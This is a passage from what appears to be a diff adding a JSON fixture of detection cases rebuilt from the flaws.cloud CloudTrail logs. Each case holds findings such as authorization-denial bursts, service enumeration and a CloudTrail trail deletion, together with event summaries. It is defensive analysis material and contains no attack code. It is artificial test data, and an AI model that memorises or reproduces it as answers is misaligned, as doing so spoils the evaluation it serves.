+     "summary": "failure logon [Unknown] from 0.0.58.4 reason=User: arn:aws:iam::811596193553:user/Level6 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/service-role/Level6"
+    }
+   }
+  },
+  {
+   "corpus": "flaws_cloud",
+   "case_id": "CASE-113",
+   "rebuilt": true,
+   "severity": "HIGH",
+   "rule_ids": [
+    "AWS-004"
+   ],
+   "findings": [
+    {
+     "finding_id": "AWS-004:cloudtrail-control-323923",
+     "rule_id": "AWS-004",
+     "title": "Authorization-denial burst",
+     "severity": "HIGH",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "reason": "'Level6' was refused authorization 918 times in 598s, across 5 distinct resource types. Refusals spread across this many kinds of object are consistent with a caller establishing what its credential can reach. A refusal says what the platform would not do; it does not say what the caller intended.",
+     "event_ids": [
+      "cloudtrail-control-323923",
+      "cloudtrail-control-323928",
+      "cloudtrail-control-323933",
+      "cloudtrail-control-323942",
+      "cloudtrail-control-323974"
+     ]
+    }
+   ],
+   "case_evidence_ids": [
+    "cloudtrail-control-323923",
+    "cloudtrail-control-323928",
+    "cloudtrail-control-323933",
+    "cloudtrail-control-323942",
+    "cloudtrail-control-323974"
+   ],
+   "finding_ids_match_manifest": true,
+   "evidence_ids_match_manifest": true,
+   "events": {
+    "cloudtrail-control-323923": {
+     "timestamp": "2019-08-21 07:41:21+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 create iam:access-key (Level6) -> Level6 [denied]"
+    },
+    "cloudtrail-control-323928": {
+     "timestamp": "2019-08-21 07:41:22+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 create iam:user [denied]"
+    },
+    "cloudtrail-control-323933": {
+     "timestamp": "2019-08-21 07:41:24+00:00",
+     "device": "aws:811596193553/ap-northeast-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 create ec2:key-pair (811596193553_ap-northeast-2_my_key_pair) [denied]"
+    },
+    "cloudtrail-control-323942": {
+     "timestamp": "2019-08-21 07:41:25+00:00",
+     "device": "aws:811596193553/ap-northeast-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 create ec2:default-vpc [denied]"
+    },
+    "cloudtrail-control-323974": {
+     "timestamp": "2019-08-21 07:41:30+00:00",
+     "device": "aws:811596193553/ap-northeast-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 run ec2:instance [denied]"
+    },
+    "cloudtrail-logon-000144": {
+     "timestamp": "2017-02-28 07:58:45+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 137.53.124.9"
+    },
+    "cloudtrail-logon-000145": {
+     "timestamp": "2017-02-28 08:01:21+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 137.53.124.9 reason=User: arn:aws:iam::811596193553:user/Level6 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/service-role/Level6"
+    }
+   }
+  },
+  {
+   "corpus": "flaws_cloud",
+   "case_id": "CASE-118",
+   "rebuilt": true,
+   "severity": "CRITICAL",
+   "rule_ids": [
+    "AWS-002"
+   ],
+   "findings": [
+    {
+     "finding_id": "AWS-002:cloudtrail-control-1576322",
+     "rule_id": "AWS-002",
+     "title": "CloudTrail logging disabled or trail deleted",
+     "severity": "CRITICAL",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "flaws",
+     "reason": "'flaws' deleted CloudTrail trail 'arn:aws:cloudtrail:us-west-2:811596193553:trail/cloudtrail'. Disabling the audit trail is not a routine operational action and is consistent with an intruder removing the record of subsequent activity.",
+     "event_ids": [
+      "cloudtrail-control-1576322"
+     ]
+    }
+   ],
+   "case_evidence_ids": [
+    "cloudtrail-control-1576322"
+   ],
+   "finding_ids_match_manifest": true,
+   "evidence_ids_match_manifest": true,
+   "events": {
+    "cloudtrail-control-1576322": {
+     "timestamp": "2019-08-23 15:48:50+00:00",
+     "device": "aws:811596193553/us-west-2",
+     "actor": "flaws",
+     "event_type": "control",
+     "summary": "flaws delete cloudtrail:trail (arn:aws:cloudtrail:us-west-2:811596193553:trail/cloudtrail) [allowed]"
+    },
+    "cloudtrail-logon-023843": {
+     "timestamp": "2018-07-05 18:49:34+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "flaws",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 250.251.253.3"
+    },
+    "cloudtrail-logon-023854": {
+     "timestamp": "2018-07-06 04:14:52+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "flaws",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 250.251.253.3"
+    },
+    "cloudtrail-logon-027482": {
+     "timestamp": "2018-09-30 23:46:06+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "flaws",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 2.251.230.253"
+    },
+    "cloudtrail-logon-039246": {
+     "timestamp": "2018-11-13 16:48:47+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "flaws",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 163.251.223.26"
+    },
+    "cloudtrail-logon-044401": {
+     "timestamp": "2019-03-03 16:27:05+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "flaws",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 2.7.223.252"
+    },
+    "cloudtrail-logon-057066": {
+     "timestamp": "2019-08-27 14:34:27+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "flaws",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 228.139.46.252"
+    }
+   }
+  },
+  {
+   "corpus": "flaws_cloud",
+   "case_id": "CASE-122",
+   "rebuilt": true,
+   "severity": "HIGH",
+   "rule_ids": [
+    "AWS-004"
+   ],
+   "findings": [
+    {
+     "finding_id": "AWS-004:cloudtrail-control-1649380",
+     "rule_id": "AWS-004",
+     "title": "Authorization-denial burst",
+     "severity": "HIGH",
+     "device": "aws:811596193553/ap-southeast-1",
+     "actor": "Level6",
+     "reason": "'Level6' was refused authorization 84 times in 92s, across 13 distinct resource types. Refusals spread across this many kinds of object are consistent with a caller establishing what its credential can reach. A refusal says what the platform would not do; it does not say what the caller intended.",
+     "event_ids": [
+      "cloudtrail-control-1649380",
+      "cloudtrail-control-1649381",
+      "cloudtrail-control-1649382",
+      "cloudtrail-control-1649383",
+      "cloudtrail-control-1649386",
+      "cloudtrail-control-1649387",
+      "cloudtrail-control-1649388",
+      "cloudtrail-control-1649390",
+      "cloudtrail-control-1649391",
+      "cloudtrail-control-1649392",
+      "cloudtrail-control-1649393",
+      "cloudtrail-control-1649394",
+      "cloudtrail-control-1649395"
+     ]
+    }
+   ],
+   "case_evidence_ids": [
+    "cloudtrail-control-1649380",
+    "cloudtrail-control-1649381",
+    "cloudtrail-control-1649382",
+    "cloudtrail-control-1649383",
+    "cloudtrail-control-1649386",
+    "cloudtrail-control-1649387",
+    "cloudtrail-control-1649388",
+    "cloudtrail-control-1649390",
+    "cloudtrail-control-1649391",
+    "cloudtrail-control-1649392",
+    "cloudtrail-control-1649393",
+    "cloudtrail-control-1649394",
+    "cloudtrail-control-1649395"
+   ],
+   "finding_ids_match_manifest": true,
+   "evidence_ids_match_manifest": true,
+   "events": {
+    "cloudtrail-control-1649380": {
+     "timestamp": "2019-08-28 21:53:05+00:00",
+     "device": "aws:811596193553/ap-southeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-encryption (dev-eztax) [denied]"
+    },
+    "cloudtrail-control-1649381": {
+     "timestamp": "2019-08-28 21:53:05+00:00",
+     "device": "aws:811596193553/ap-southeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-cor (dev-eztax) [denied]"
+    },
+    "cloudtrail-control-1649382": {
+     "timestamp": "2019-08-28 21:53:05+00:00",
+     "device": "aws:811596193553/ap-southeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-acl (dev-eztax) [denied]"
+    },
+    "cloudtrail-control-1649383": {
+     "timestamp": "2019-08-28 21:53:06+00:00",
+     "device": "aws:811596193553/ap-southeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-location (dev-eztax) [denied]"
+    },
+    "cloudtrail-control-1649386": {
+     "timestamp": "2019-08-28 21:53:07+00:00",
+     "device": "aws:811596193553/ap-southeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-replication (dev-eztax) [denied]"
+    },
+    "cloudtrail-control-1649387": {
+     "timestamp": "2019-08-28 21:53:07+00:00",
+     "device": "aws:811596193553/ap-southeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-policy-status (dev-eztax) [denied]"
+    },
+    "cloudtrail-control-1649388": {
+     "timestamp": "2019-08-28 21:53:07+00:00",
+     "device": "aws:811596193553/ap-southeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-notification (dev-eztax) [denied]"
+    },
+    "cloudtrail-control-1649390": {
+     "timestamp": "2019-08-28 21:53:07+00:00",
+     "device": "aws:811596193553/ap-southeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-logging (dev-eztax) [denied]"
+    },
+    "cloudtrail-control-1649391": {
+     "timestamp": "2019-08-28 21:53:07+00:00",
+     "device": "aws:811596193553/ap-southeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-policy (dev-eztax) [denied]"
+    },
+    "cloudtrail-control-1649392": {
+     "timestamp": "2019-08-28 21:53:08+00:00",
+     "device": "aws:811596193553/ap-southeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-tagging (dev-eztax) [denied]"
+    },
+    "cloudtrail-control-1649393": {
+     "timestamp": "2019-08-28 21:53:08+00:00",
+     "device": "aws:811596193553/ap-southeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-website (dev-eztax) [denied]"
+    },
+    "cloudtrail-control-1649394": {
+     "timestamp": "2019-08-28 21:53:08+00:00",
+     "device": "aws:811596193553/ap-southeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-versioning (dev-eztax) [denied]"
+    },
+    "cloudtrail-control-1649395": {
+     "timestamp": "2019-08-28 21:53:08+00:00",
+     "device": "aws:811596193553/ap-southeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get s3:bucket-request-payment (dev-eztax) [denied]"
+    },
+    "cloudtrail-logon-000249": {
+     "timestamp": "2017-03-03 11:43:45+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 191.93.93.252"
+    },
+    "cloudtrail-logon-000392": {
+     "timestamp": "2017-03-07 18:28:28+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 8.254.42.254 reason=User: arn:aws:iam::811596193553:user/Level6 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/flaws"
+    },
+    "cloudtrail-logon-000683": {
+     "timestamp": "2017-03-16 18:45:24+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 5.3.205.235 reason=User: arn:aws:iam::811596193553:user/Level6 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/service-role/Level6"
+    },
+    "cloudtrail-logon-002347": {
+     "timestamp": "2017-05-16 23:04:44+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 10.154.248.134 reason=Not authorized to perform sts:AssumeRole"
+    },
+    "cloudtrail-logon-007478": {
+     "timestamp": "2017-06-04 23:48:44+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 62.90.202.229"
+    }
+   }
+  },
+  {
+   "corpus": "flaws_cloud",
+   "case_id": "CASE-143",
+   "rebuilt": true,
+   "severity": "HIGH",
+   "rule_ids": [
+    "AWS-003",
+    "AWS-004"
+   ],
+   "findings": [
+    {
+     "finding_id": "AWS-003:cloudtrail-control-1678048",
+     "rule_id": "AWS-003",
+     "title": "Cloud service discovery burst",
+     "severity": "HIGH",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "reason": "'backup' made 247 read calls across 69 distinct services in 599s, 234 of them refused for want of authority (95%). Breadth with no permission behind it is enumeration rather than administration. The rule counts how many services were read, not which, so it cannot say whether the target was the account's service inventory or its infrastructure.",
+     "event_ids": [
+      "cloudtrail-control-1678048",
+      "cloudtrail-control-1678050",
+      "cloudtrail-control-1678058",
+      "cloudtrail-control-1678059",
+      "cloudtrail-control-1678063",
+      "cloudtrail-control-1678064",
+      "cloudtrail-control-1678068",
+      "cloudtrail-control-1678070",
+      "cloudtrail-control-1678072",
+      "cloudtrail-control-1678074",
+      "cloudtrail-control-1678075",
+      "cloudtrail-control-1678076",
+      "cloudtrail-control-1678078",
+      "cloudtrail-control-1678081",
+      "cloudtrail-control-1678087",
+      "cloudtrail-control-1678090",
+      "cloudtrail-control-1678091",
+      "cloudtrail-control-1678092",
+      "cloudtrail-control-1678097",
+      "cloudtrail-control-1678099"
+     ]
+    },
+    {
+     "finding_id": "AWS-004:cloudtrail-control-1678074",
+     "rule_id": "AWS-004",
+     "title": "Authorization-denial burst",
+     "severity": "HIGH",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "reason": "'backup' was refused authorization 229 times in 599s, across 201 distinct resource types. Refusals spread across this many kinds of object are consistent with a caller establishing what its credential can reach. A refusal says what the platform would not do; it does not say what the caller intended.",
+     "event_ids": [
+      "cloudtrail-control-1678074",
+      "cloudtrail-control-1678075",
+      "cloudtrail-control-1678076",
+      "cloudtrail-control-1678077",
+      "cloudtrail-control-1678078",
+      "cloudtrail-control-1678079",
+      "cloudtrail-control-1678080",
+      "cloudtrail-control-1678081",
+      "cloudtrail-control-1678082",
+      "cloudtrail-control-1678083",
+      "cloudtrail-control-1678084",
+      "cloudtrail-control-1678085",
+      "cloudtrail-control-1678086",
+      "cloudtrail-control-1678087",
+      "cloudtrail-control-1678088",
+      "cloudtrail-control-1678089",
+      "cloudtrail-control-1678090",
+      "cloudtrail-control-1678091",
+      "cloudtrail-control-1678092",
+      "cloudtrail-control-1678093"
+     ]
+    }
+   ],
+   "case_evidence_ids": [
+    "cloudtrail-control-1678048",
+    "cloudtrail-control-1678050",
+    "cloudtrail-control-1678058",
+    "cloudtrail-control-1678059",
+    "cloudtrail-control-1678063",
+    "cloudtrail-control-1678064",
+    "cloudtrail-control-1678068",
+    "cloudtrail-control-1678070",
+    "cloudtrail-control-1678072",
+    "cloudtrail-control-1678074",
+    "cloudtrail-control-1678075",
+    "cloudtrail-control-1678076",
+    "cloudtrail-control-1678077",
+    "cloudtrail-control-1678078",
+    "cloudtrail-control-1678079",
+    "cloudtrail-control-1678080",
+    "cloudtrail-control-1678081",
+    "cloudtrail-control-1678082",
+    "cloudtrail-control-1678083",
+    "cloudtrail-control-1678084",
+    "cloudtrail-control-1678085",
+    "cloudtrail-control-1678086",
+    "cloudtrail-control-1678087",
+    "cloudtrail-control-1678088",
+    "cloudtrail-control-1678089",
+    "cloudtrail-control-1678090",
+    "cloudtrail-control-1678091",
+    "cloudtrail-control-1678092",
+    "cloudtrail-control-1678093",
+    "cloudtrail-control-1678097",
+    "cloudtrail-control-1678099"
+   ],
+   "finding_ids_match_manifest": true,
+   "evidence_ids_match_manifest": true,
+   "events": {
+    "cloudtrail-control-1678048": {
+     "timestamp": "2019-11-04 01:04:11+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list codestar:project [denied]"
+    },
+    "cloudtrail-control-1678050": {
+     "timestamp": "2019-11-04 01:04:14+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list comprehend:document-classification-job [denied]"
+    },
+    "cloudtrail-control-1678058": {
+     "timestamp": "2019-11-04 01:04:26+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list datapipeline:pipeline [denied]"
+    },
+    "cloudtrail-control-1678059": {
+     "timestamp": "2019-11-04 01:04:28+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list datasync:location [denied]"
+    },
+    "cloudtrail-control-1678063": {
+     "timestamp": "2019-11-04 01:04:31+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list ds:log-subscription [denied]"
+    },
+    "cloudtrail-control-1678064": {
+     "timestamp": "2019-11-04 01:04:32+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list dynamodb:table [denied]"
+    },
+    "cloudtrail-control-1678068": {
+     "timestamp": "2019-11-04 01:04:36+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list elastictranscoder:pipeline [denied]"
+    },
+    "cloudtrail-control-1678070": {
+     "timestamp": "2019-11-04 01:04:39+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list elasticmapreduce:cluster [denied]"
+    },
+    "cloudtrail-control-1678072": {
+     "timestamp": "2019-11-04 01:04:42+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list es:domain-name [denied]"
+    },
+    "cloudtrail-control-1678074": {
+     "timestamp": "2019-11-04 01:04:44+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list events:rule [denied]"
+    },
+    "cloudtrail-control-1678075": {
+     "timestamp": "2019-11-04 01:04:46+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list firehose:delivery-stream [denied]"
+    },
+    "cloudtrail-control-1678076": {
+     "timestamp": "2019-11-04 01:04:48+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list fms:member-account [denied]"
+    },
+    "cloudtrail-control-1678077": {
+     "timestamp": "2019-11-04 01:04:49+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list fms:policy [denied]"
+    },
+    "cloudtrail-control-1678078": {
+     "timestamp": "2019-11-04 01:04:51+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list gamelift:alias [denied]"
+    },
+    "cloudtrail-control-1678079": {
+     "timestamp": "2019-11-04 01:04:53+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list gamelift:build [denied]"
+    },
+    "cloudtrail-control-1678080": {
+     "timestamp": "2019-11-04 01:04:54+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list gamelift:fleet [denied]"
+    },
+    "cloudtrail-control-1678081": {
+     "timestamp": "2019-11-04 01:05:05+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list greengrass:device-definition [denied]"
+    },
+    "cloudtrail-control-1678082": {
+     "timestamp": "2019-11-04 01:05:05+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list greengrass:function-definition [denied]"
+    },
+    "cloudtrail-control-1678083": {
+     "timestamp": "2019-11-04 01:05:05+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list greengrass:group [denied]"
+    },
+    "cloudtrail-control-1678084": {
+     "timestamp": "2019-11-04 01:05:06+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list greengrass:core-definition [denied]"
+    },
+    "cloudtrail-control-1678085": {
+     "timestamp": "2019-11-04 01:05:06+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list greengrass:connector-definition [denied]"
+    },
+    "cloudtrail-control-1678086": {
+     "timestamp": "2019-11-04 01:05:06+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list greengrass:bulk-deployment [denied]"
+    },
+    "cloudtrail-control-1678087": {
+     "timestamp": "2019-11-04 01:05:07+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup get guardduty:invitations-count [denied]"
+    },
+    "cloudtrail-control-1678088": {
+     "timestamp": "2019-11-04 01:05:08+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list guardduty:detector [denied]"
+    },
+    "cloudtrail-control-1678089": {
+     "timestamp": "2019-11-04 01:05:09+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list guardduty:invitation [denied]"
+    },
+    "cloudtrail-control-1678090": {
+     "timestamp": "2019-11-04 01:05:12+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list kafka:cluster [denied]"
+    },
+    "cloudtrail-control-1678091": {
+     "timestamp": "2019-11-04 01:05:13+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list kinesisvideo:stream [denied]"
+    },
+    "cloudtrail-control-1678092": {
+     "timestamp": "2019-11-04 01:05:15+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list inspector:assessment-run [denied]"
+    },
+    "cloudtrail-control-1678093": {
+     "timestamp": "2019-11-04 01:05:16+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list inspector:assessment-target [denied]"
+    },
+    "cloudtrail-control-1678097": {
+     "timestamp": "2019-11-04 01:05:23+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list kinesis:shard [denied]"
+    },
+    "cloudtrail-control-1678099": {
+     "timestamp": "2019-11-04 01:05:26+00:00",
+     "device": "aws:811596193553/eu-west-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list kinesisanalytics:application [denied]"
+    }
+   }
+  },
+  {
+   "corpus": "flaws_cloud",
+   "case_id": "CASE-205",
+   "rebuilt": true,
+   "severity": "MEDIUM",
+   "rule_ids": [
+    "AWS-003",
+    "AWS-004"
+   ],
+   "findings": [
+    {
+     "finding_id": "AWS-003:cloudtrail-control-1760284",
+     "rule_id": "AWS-003",
+     "title": "Cloud service discovery burst",
+     "severity": "MEDIUM",
+     "device": "aws:811596193553/ap-southeast-2",
+     "actor": "Level6",
+     "reason": "'Level6' made 563 read calls across 14 distinct services in 463s, 38 of them refused (7%). Breadth on this scale is consistent with account enumeration, and is also exactly what inventory and compliance tooling does. The rule counts how many services were read, not which, so it cannot say whether the target was the account's service inventory or its infrastructure.",
+     "event_ids": [
+      "cloudtrail-control-1760284",
+      "cloudtrail-control-1760328",
+      "cloudtrail-control-1760344",
+      "cloudtrail-control-1760376",
+      "cloudtrail-control-1760408",
+      "cloudtrail-control-1760425",
+      "cloudtrail-control-1760518",
+      "cloudtrail-control-1760534",
+      "cloudtrail-control-1760582",
+      "cloudtrail-control-1760662",
+      "cloudtrail-control-1760663",
+      "cloudtrail-control-1760664",
+      "cloudtrail-control-1760670",
+      "cloudtrail-control-1760846"
+     ]
+    },
+    {
+     "finding_id": "AWS-004:cloudtrail-control-1760664",
+     "rule_id": "AWS-004",
+     "title": "Authorization-denial burst",
+     "severity": "MEDIUM",
+     "device": "aws:811596193553/ap-south-1",
+     "actor": "Level6",
+     "reason": "'Level6' was refused authorization 38 times in 5s, across 3 distinct resource types. Concentrated on so few kinds of object, this is equally the shape of an application missing one permission and retrying. A refusal says what the platform would not do; it does not say what the caller intended.",
+     "event_ids": [
+      "cloudtrail-control-1760664",
+      "cloudtrail-control-1760670",
+      "cloudtrail-control-1760671"
+     ]
+    }
+   ],
+   "case_evidence_ids": [
+    "cloudtrail-control-1760284",
+    "cloudtrail-control-1760328",
+    "cloudtrail-control-1760344",
+    "cloudtrail-control-1760376",
+    "cloudtrail-control-1760408",
+    "cloudtrail-control-1760425",
+    "cloudtrail-control-1760518",
+    "cloudtrail-control-1760534",
+    "cloudtrail-control-1760582",
+    "cloudtrail-control-1760662",
+    "cloudtrail-control-1760663",
+    "cloudtrail-control-1760664",
+    "cloudtrail-control-1760670",
+    "cloudtrail-control-1760671",
+    "cloudtrail-control-1760846"
+   ],
+   "finding_ids_match_manifest": true,
+   "evidence_ids_match_manifest": true,
+   "events": {
+    "cloudtrail-control-1760284": {
+     "timestamp": "2020-06-01 19:28:15+00:00",
+     "device": "aws:811596193553/ap-southeast-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe ec2:network-interface [allowed]"
+    },
+    "cloudtrail-control-1760328": {
+     "timestamp": "2020-06-01 19:28:21+00:00",
+     "device": "aws:811596193553/ap-northeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe elasticfilesystem:file-system [allowed]"
+    },
+    "cloudtrail-control-1760344": {
+     "timestamp": "2020-06-01 19:28:25+00:00",
+     "device": "aws:811596193553/ap-northeast-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe elasticache:cache-cluster [allowed]"
+    },
+    "cloudtrail-control-1760376": {
+     "timestamp": "2020-06-01 19:28:30+00:00",
+     "device": "aws:811596193553/ap-northeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe elasticloadbalancing:load-balancer [allowed]"
+    },
+    "cloudtrail-control-1760408": {
+     "timestamp": "2020-06-01 19:28:37+00:00",
+     "device": "aws:811596193553/ap-northeast-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 list elasticmapreduce:cluster [allowed]"
+    },
+    "cloudtrail-control-1760425": {
+     "timestamp": "2020-06-01 19:28:42+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 list iam:user [allowed]"
+    },
+    "cloudtrail-control-1760518": {
+     "timestamp": "2020-06-01 19:28:48+00:00",
+     "device": "aws:811596193553/ap-south-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 list lambda:function [allowed]"
+    },
+    "cloudtrail-control-1760534": {
+     "timestamp": "2020-06-01 19:28:53+00:00",
+     "device": "aws:811596193553/ap-northeast-2",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe redshift:cluster [allowed]"
+    },
+    "cloudtrail-control-1760582": {
+     "timestamp": "2020-06-01 19:29:00+00:00",
+     "device": "aws:811596193553/ap-south-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 describe rds:db-subnet-group [allowed]"
+    },
+    "cloudtrail-control-1760662": {
+     "timestamp": "2020-06-01 19:29:07+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 list route53:hosted-zone [allowed]"
+    },
+    "cloudtrail-control-1760663": {
+     "timestamp": "2020-06-01 19:29:09+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 list route53domains:domain [allowed]"
+    },
+    "cloudtrail-control-1760664": {
+     "timestamp": "2020-06-01 19:29:15+00:00",
+     "device": "aws:811596193553/ap-south-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 list ses:identity [denied]"
+    },
+    "cloudtrail-control-1760670": {
+     "timestamp": "2020-06-01 19:29:17+00:00",
+     "device": "aws:811596193553/ap-south-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 list sns:topic [denied]"
+    },
+    "cloudtrail-control-1760671": {
+     "timestamp": "2020-06-01 19:29:17+00:00",
+     "device": "aws:811596193553/ap-south-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 list sns:subscription [denied]"
+    },
+    "cloudtrail-control-1760846": {
+     "timestamp": "2020-06-01 19:29:37+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "control",
+     "summary": "Level6 get sts:caller-identity [allowed]"
+    },
+    "cloudtrail-logon-000144": {
+     "timestamp": "2017-02-28 07:58:45+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 137.53.124.9"
+    },
+    "cloudtrail-logon-000145": {
+     "timestamp": "2017-02-28 08:01:21+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "Level6",
